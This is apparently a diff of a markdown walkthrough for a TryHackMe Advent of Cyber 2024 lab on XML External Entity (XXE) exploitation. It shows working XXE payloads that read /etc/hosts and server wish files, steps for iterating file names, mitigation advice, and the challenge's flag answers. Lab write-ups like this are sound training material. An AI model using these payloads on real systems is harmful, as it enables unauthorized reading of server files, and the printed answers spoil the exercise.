@@ -1,156 +1,119 @@
 # 🎄 TryHackMe Advent of Cyber 2024 – Day 5: XXE Exploitation Challenge
 
-## Challenge Overview 🎅
-
-Day 5 takes us into the world of **XML External Entity (XXE) vulnerabilities**, highlighting how improper XML parsing can expose sensitive information or allow attackers to perform malicious actions. In this challenge, we exploit a vulnerability in Wareville's Christmas wishlist application, uncover hidden data, and investigate signs of possible sabotage in the development process.
-
 ## Objectives 🎯
 
-1. Understand how XML and entities work to uncover the root cause of XXE vulnerabilities.
+1. Understand how XML and entities work to identify XXE vulnerabilities.
 2. Exploit the XXE vulnerability to access restricted files.
-3. Investigate and confirm suspicious modifications in the application's development history.
+3. Investigate application development history for signs of sabotage.
 
-## Key Concepts 💡
+## Steps 🚀
 
-### What is XML?
-XML (eXtensible Markup Language) is a standardized way for systems to exchange structured data. Tags like `<name>` and `<address>` help organize the data into a human- and machine-readable format.
+### Step 1: Identifying the XXE Vulnerability
 
-### Entities in XML
-Entities act like placeholders in XML and can be used to:
-- Repeat or reference internal data.
-- Load external data or files using URLs.
+#### Setting Up Burp Suite
+1. **Install and Launch Burp Suite:**  
+   - Download Burp Suite [here](https://portswigger.net/burp).
+2. **Navigate to the Website:**  
+   - Open Burp's browser and visit `http://MACHINE_IP/product.php`.
+3. **Add a Product to Wishlist:**  
+   - Intercept the "Add to Wishlist" request using Burp Suite’s **Proxy** tab.
 
-### What is XXE?
-XXE (XML External Entity) vulnerabilities occur when an XML parser fails to restrict the resolution of external entities, enabling attackers to:
-- Access sensitive files (e.g., `/etc/passwd`).
-- Send malicious requests to backend systems.
-- Perform denial-of-service (DoS) or even remote code execution.
+#### Crafting the Payload
+1. **Intercept and Modify the Request:**  
+   Replace the `<product_id>` value in the XML with an external entity reference:
+   ```
+   <!--?xml version="1.0"?-->
+   <!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]>
+   <wishlist>
+     <user_id>1</user_id>
+     <item>
+       <product_id>&payload;</product_id>
+     </item>
+   </wishlist>
+   ```
+2. **Send the Request:**  
+   Use Burp’s **Repeater** tab to send the modified request and observe the response.
 
-## Step 1: Identifying the XXE Vulnerability
+### Step 2: Exploiting the XXE Vulnerability
 
-### Setting Up Burp Suite
-1. **Install Burp Suite:**
-   - Launch Burp Suite. You can download it [here](https://portswigger.net/burp).
-2. **Navigate to the Website:**
-   - Open Burp's pre-configured browser and visit `http://MACHINE_IP/product.php`.
-3. **Add a Product to the Wishlist:**
-   - Click "Add to Wishlist" for a product, and intercept the request using Burp Suite's **Proxy** tab.
+#### Accessing Sensitive Files
+1. **Target Files in the Server:**  
+   Modify the payload to access files in `/var/www/html/wishes/`:
+   ```
+   <!--?xml version="1.0"?-->
+   <!DOCTYPE foo [<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_1.txt"> ]>
+   <wishlist>
+     <user_id>1</user_id>
+     <item>
+       <product_id>&payload;</product_id>
+     </item>
+   </wishlist>
+   ```
+2. **Iterate Through Files:**  
+   Change the file name incrementally (e.g., `wish_2.txt`, `wish_3.txt`) to uncover additional content.
 
-### Crafting the Payload
-1. **Intercept the Request:**
-   - The request sends XML like this:
-     ```
-     <wishlist>
-       <user_id>1</user_id>
-       <item>
-         <product_id>1</product_id>
-       </item>
-     </wishlist>
-     ```
-2. **Modify the Payload:**
-   - Replace the `<product_id>` tag with a reference to an external entity:
-     ```
-     <!--?xml version="1.0"?-->
-     <!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]>
-     <wishlist>
-       <user_id>1</user_id>
-       <item>
-         <product_id>&payload;</product_id>
-       </item>
-     </wishlist>
-     ```
-3. **Send the Updated Request:**
-   - Use Burp Suite’s **Repeater** tab to send the modified request and observe the response. The response confirms access to `/etc/hosts`, validating the XXE vulnerability.
-   - 
-## Step 2: Exploiting the XXE Vulnerability
-
-### Accessing Sensitive Files
-1. **Target a Specific File:**
-   - Update the payload to read from `/var/www/html/wishes/`:
-     ```
-     <!--?xml version="1.0"?-->
-     <!DOCTYPE foo [<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_1.txt"> ]>
-     <wishlist>
-       <user_id>1</user_id>
-       <item>
-         <product_id>&payload;</product_id>
-       </item>
-     </wishlist>
-     ```
-2. **Iterate Through Wishes:**
-   - Change the file name incrementally (e.g., `wish_2.txt`, `wish_3.txt`) to discover additional wishes.
-
-### Discovering the Flag
-- On `wish_15.txt`, the response reveals:
+#### Discovering the Flag
+- On `wish_15.txt`, the response reveals:  
   ```
-  The product ID: Wish #15
-  Name: Mayor Malware
-  Address: Test
-  ---------------------------------------
-  Product: Waredy Cane
-  Quantity: 1
-  ---------------------------------------
   PS: The flag is THM{Brut3f0rc1n6_mY_w4y}
   ```
 
-**Answer: `THM{Brut3f0rc1n6_mY_w4y}`**
+### Step 3: Investigating the Sabotage
 
-## Step 3: Investigating the Sabotage
+#### Accessing the Changelog
+1. **View the Changelog:**  
+   Visit `http://MACHINE_IP/CHANGELOG`.
+2. **Analyze Entries:**  
+   The changelog indicates a recent update introducing vulnerable XML parser code.
 
-### Accessing the CHANGELOG
-1. **Navigate to the Changelog:**
-   - Visit `http://MACHINE_IP/CHANGELOG` directly.
-2. **Review the Entries:**
-   - The changelog reveals that a recent push introduced the vulnerable XML parser code. This evidence points to potential sabotage by Mayor Malware.
+#### Discovering the Sabotage Flag
+- The changelog reveals the sabotage:  
+  **Answer:** `THM{m4y0r_m4lw4r3_b4ckd00rs}`
 
-**Answer: `THM{m4y0r_m4lw4r3_b4ckd00rs}`**
+## Key Findings 🔑
+
+1. **Sensitive File Access:** Exploiting the XXE vulnerability enabled access to restricted server files.
+2. **Evidence of Sabotage:** The changelog confirmed suspicious modifications by Mayor Malware.
+3. **Unsecure XML Parsing:** The vulnerability arose from improperly handled external entities.
 
 ## Lessons Learned 🌟
 
-### Takeaways on XXE Exploitation
-1. **Understanding XML and Entities:**
-   - XML is powerful for structured data exchange but can pose security risks without proper validation.
-2. **How XXE Exploitation Works:**
-   - Injecting malicious entities into XML allows attackers to access restricted files or interact with backend systems.
+### Understanding XXE Exploitation
+1. **XML Risks:** XML parsing without restrictions can expose sensitive backend systems.
+2. **Entity Resolution:** External entities can be used to access files or send malicious requests.
 
 ### Mitigation Strategies
-1. **Disable External Entity Loading:**
-   - In PHP, use `libxml_disable_entity_loader(true)` to prevent external entities from being resolved.
-2. **Validate and Sanitize Input:**
-   - Ensure only expected XML structures are processed, blocking references to sensitive paths like `/etc/hosts`.
-3. **Conduct Regular Security Audits:**
-   - Review applications for vulnerabilities before deploying them to production.
+1. **Disable External Entity Loading:**  
+   - Use `libxml_disable_entity_loader(true)` in PHP.
+2. **Input Validation:**  
+   - Restrict XML structures and validate inputs before processing.
+3. **Regular Audits:**  
+   - Review and test applications for vulnerabilities prior to deployment.
 
-## Tools Used 🛠️
+## Tools and Techniques 🛠️
 
-1. **[Burp Suite](https://portswigger.net/burp):** Intercepted and modified HTTP requests to identify and exploit the XXE vulnerability.
-2. **XML:** Crafted payloads to exploit the vulnerability.
-3. **Browser:** Accessed the application and verified exploitation outcomes.
+1. **[Burp Suite](https://portswigger.net/burp):** Intercepted and modified HTTP requests to test for XXE.  
+2. **XML Payloads:** Exploited vulnerabilities using custom XML with external entities.  
+3. **Browser:** Accessed the application and verified the exploitation outcomes.
 
 ## Final Thoughts 🎁
 
-Day 5’s challenge demonstrated the critical importance of secure coding and validation practices. By leveraging improperly sanitized XML parsing, we accessed sensitive information and uncovered sabotage evidence. This challenge reinforced:
-- The dangers of XXE vulnerabilities in real-world applications.
-- The need for thorough security testing during development.
-- The importance of developer awareness regarding secure coding practices.
+Day 5 emphasized the importance of secure coding practices when dealing with XML. The challenge demonstrated how improper parsing could expose sensitive data and highlighted the dangers of external entities. Understanding these risks and addressing them proactively is crucial for secure application development.
 
-By addressing these lessons, developers and organizations can prevent vulnerabilities like XXE from becoming a real-world threat.
-
-## Questions and Answers
+### Answers ✅
 
 1. **What is the flag discovered after navigating through the wishes?**  
-   **Answer:** `THM{Brut3f0rc1n6_mY_w4y}`
-
+   **Answer:** `THM{Brut3f0rc1n6_mY_w4y}`  
 2. **What is the flag seen on the possible proof of sabotage?**  
-   **Answer:** `THM{m4y0r_m4lw4r3_b4ckd00rs}`
+   **Answer:** `THM{m4y0r_m4lw4r3_b4ckd00rs}`  
 
 ## Table of Contents 📚
 
-- [Day 1: OPSEC Challenge](day1.md)
-- [Day 2: Log Analysis](day2.md)
-- [Day 3: Log Analysis](day3.md)
-- [Day 4: Atomic Red Team](day4.md)
-- [Day 6: Sandboxes](day6.md)
-- [Day 7: AWS Sandboxes](day7.md)
+- [Day 1: OPSEC Challenge](day1.md)  
+- [Day 2: Log Analysis](day2.md)  
+- [Day 3: Log Analysis](day3.md)  
+- [Day 4: Atomic Red Team](day4.md)  
+- **[Day 5: XXE Exploitation](day5.md)**  
+- [Day 6: Sandboxes](day6.md)  
+- [Day 7: AWS Sandboxes](day7.md)  
 - [More Days to Come!](README.md)
-```
